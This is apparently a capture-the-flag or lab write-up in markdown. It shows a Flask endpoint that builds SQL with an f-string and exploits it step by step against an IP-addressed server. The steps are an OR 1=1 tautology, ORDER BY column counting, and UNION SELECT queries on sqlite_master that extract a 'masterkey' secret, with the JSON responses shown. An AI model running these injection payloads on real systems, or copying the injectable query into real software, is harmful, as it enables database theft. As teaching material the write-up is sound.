<img width="1614" height="736" alt="image" src="https://github.com/user-attachments/assets/173b3f3a-f2da-44fb-a3ea-03e1735f0096" />

```python
# Route: Users index (with UID in the URL)
@app.route('/users/<string:user_id>', methods=['GET'])
def get_user(user_id):
    # Using the secure method to get user by ID from UserService
    user = UserService.get_user_by_id(user_id)
    
    if user:
        # Return the user data as JSON
        return jsonify({
            'id': user[0],   # ID from the database (index 0)
            'name': user[1],  # Name from the database (index 1)
            'email': user[2]  # Email from the database (index 2)
        })
    else:
        return jsonify({'message': 'User not found'}), 404
```

## i try to find users by 

```url
http://54.216.80.27/users/1
```

**`response`**

```json
[
  {
    "id": 1,
    "name": "Alice",
    "email": "alice@example.com",
    "created_at": "2025-04-17T20:25:57.414Z",
    "updated_at": "2025-04-17T20:25:57.414Z"
  }
]
```

```json
[
  {
    "id": 2,
    "name": "Bob",
    "email": "bob@example.com",
    "created_at": "2025-04-17T20:25:58.713Z",
    "updated_at": "2025-04-17T20:25:58.713Z"
  }
]
```

```json
[
  {
    "id": 3,
    "name": "Charlie",
    "email": "charlie@example.com",
    "created_at": "2025-04-17T20:26:00.065Z",
    "updated_at": "2025-04-17T20:26:00.065Z"
  }
]
```

---

```python
def get_user_by_id(user_id):
        query = text(f"SELECT * FROM user WHERE id = {user_id}")
        result = db.session.execute(query, {'user_id': user_id}).fetchone()
        return result
```

```python
query = text(f"SELECT * FROM user WHERE id = {user_id}")
```

```sql
SELECT * FROM user WHERE id = 1
```

> so to show all users

```sql
SELECT * FROM user WHERE id = 1 or 1=1--
```

```url
http://54.216.80.27/users/1%20OR%201=1--
```

<img width="653" height="649" alt="image" src="https://github.com/user-attachments/assets/3d3a1315-cde5-4d51-984d-555c5eb72318" />

## NOW use ``union`` to find number of columns

```
/users/1 ORDER BY 1--
/users/1 ORDER BY 2--
/users/1 ORDER BY 3--
/users/1 ORDER BY 4--
/users/1 ORDER BY 5--
/users/1 ORDER BY 6--
```

> ### **`/users/1 ORDER BY 6--`** return `500 internal server error` so it's 5 columns 

> ### NOW want to know tables names

```
/users/-1 UNION SELECT NULL,name,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

<img width="1342" height="941" alt="image" src="https://github.com/user-attachments/assets/293e7b9c-25a2-44c6-b555-ad5984537a62" />

```json
[
  {
    "id": null,
    "name": "ar_internal_metadata",
    "email": null,
    "created_at": null,
    "updated_at": null
  },
  {
    "id": null,
    "name": "masterkey",
    "email": null,
    "created_at": null,
    "updated_at": null
  },
  {
    "id": null,
    "name": "masterkeys",
    "email": null,
    "created_at": null,
    "updated_at": null
  },
  {
    "id": null,
    "name": "schema_migrations",
    "email": null,
    "created_at": null,
    "updated_at": null
  },
  {
    "id": null,
    "name": "sqlite_sequence",
    "email": null,
    "created_at": null,
    "updated_at": null
  },
  {
    "id": null,
    "name": "users",
    "email": null,
    "created_at": null,
    "updated_at": null
  }
]
```

## show columns of **`masterkey`** table

```
/users/-1 UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE name='masterkey'--
```

found one 

```json
[
  {
    "id": 1,
    "name": "masterkey",
    "email": "CREATE TABLE masterkey ( id INTEGER PRIMARY KEY AUTOINCREMENT, masterkey TEXT )",
    "created_at": 4,
    "updated_at": 5
  }
]
```

## now get content of it 

```url
/users/-1 UNION SELECT 1,masterkey,3,4,5 FROM masterkey--
```

```json
[
  {
    "id": 1,
    "name": "cfc8ed823104d9d686fa0dbeb3826dfb",
    "email": "3",
    "created_at": 4,
    "updated_at": 5
  }
]
```

